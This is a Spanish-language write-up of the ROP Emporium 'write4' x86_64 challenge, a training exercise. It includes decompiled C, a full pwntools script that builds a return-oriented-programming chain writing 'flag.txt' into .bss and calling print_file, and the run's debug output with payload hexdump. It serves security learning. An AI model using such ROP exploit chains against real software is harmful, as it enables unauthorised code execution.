---
layout:
  width: default
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Write4 (x86\_64)

Este ejercicio es casi el mismo que [callme](callme-x86_64.md). La diferencia principal es que en lugar de tener que llamar a unas funciones de la libc externa con x parámetros para desencriptar hay que llamar una función, también de la libc que nos dan, y pasarle por parámetro un puntero al string "flag.txt", vamos a verlo:

```c
void print_file(char *param_1)
{
    char array[40];
    FILE *ptr_flag;

    ptr_flag = (FILE *)0x0;
    ptr_flag = fopen(param_1, "r"); // Aquí
    if (ptr_flag == (FILE *)0x0) {
        printf("Failed to open file: %s\n", param_1);
        exit(1);
    }

    fgets(array, 0x21, ptr_flag);
    puts(array);
    fclose(ptr_flag);
    return;
}
```

Como podemos ver se abre el archivo que le pasemos como parámetro a la función y luego la imprime usando punteros. Parece fácil, simplemente usamos un gadget que haga un `pop rdi` y le pasamos `flag.txt` y listo, no? Pues no es tan fácil ya que `fopen` pide un puntero a un string y no el valor directamente. Para solucionar esto vamos a meter `flag.txt` en la sección de memoria `.bss` usando un gadget y luego vamos a mandarle el puntero como parámetro. Con pwntools podemos automatizar la búsqueda de la dirección inicial de bss con `exe.bss()`. Vamos a hacer el exploit:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("write4")
libc = ELF("libwrite4.so")

context.binary = exe
context.terminal = ['kitty']
gdb_script = f'''
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("addr", 1337)

def main():
    io = conn()
    
    offset = 40
    pop_rdi = 0x00400693 # pop rdi, ret
    mov_r14_r15 = 0x00400628 # mov qword ptr [r14], r15 ; ret
    pop_r14_r15 = 0x00400690 # pop r14 ; pop r15 ; ret
    
    payload = flat({
        offset: [
            pop_r14_r15, exe.bss(), b'flag.txt',
            mov_r14_r15,
            pop_rdi,    exe.bss(),
            exe.plt['print_file'],
        ]
    })

    io.sendlineafter(b'> ', payload)
    
    io.interactive()

if __name__ == "__main__":
    main()

```

> Si el programa escribiera algo en .bss habría que tenerlo en cuenta y sumar a `exe.bss()` lo necesario para que cuadre con el primer espacio libre

```c
[+] Starting local process '/home/ub1cu0/Desktop/ropEmporium/write4/write4': pid 799711
[DEBUG] Received 0x4a bytes:
    b'write4 by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Go ahead and give me the input already!\n'
    b'\n'
    b'> '
[DEBUG] Sent 0x61 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  90 06 40 00  00 00 00 00  │iaaa│jaaa│··@·│····│
    00000030  38 10 60 00  00 00 00 00  66 6c 61 67  2e 74 78 74  │8·`·│····│flag│.txt│
    00000040  28 06 40 00  00 00 00 00  93 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    00000050  38 10 60 00  00 00 00 00  10 05 40 00  00 00 00 00  │8·`·│····│··@·│····│
    00000060  0a                                                  │·│
    00000061
[*] Switching to interactive mode
[DEBUG] Received 0x2c bytes:
    b'Thank you!\n'
    b'ROPE{a_placeholder_32byte_flag!}\n'
Thank you!
ROPE{a_placeholder_32byte_flag!}
```

Y así conseguiremos la flag!
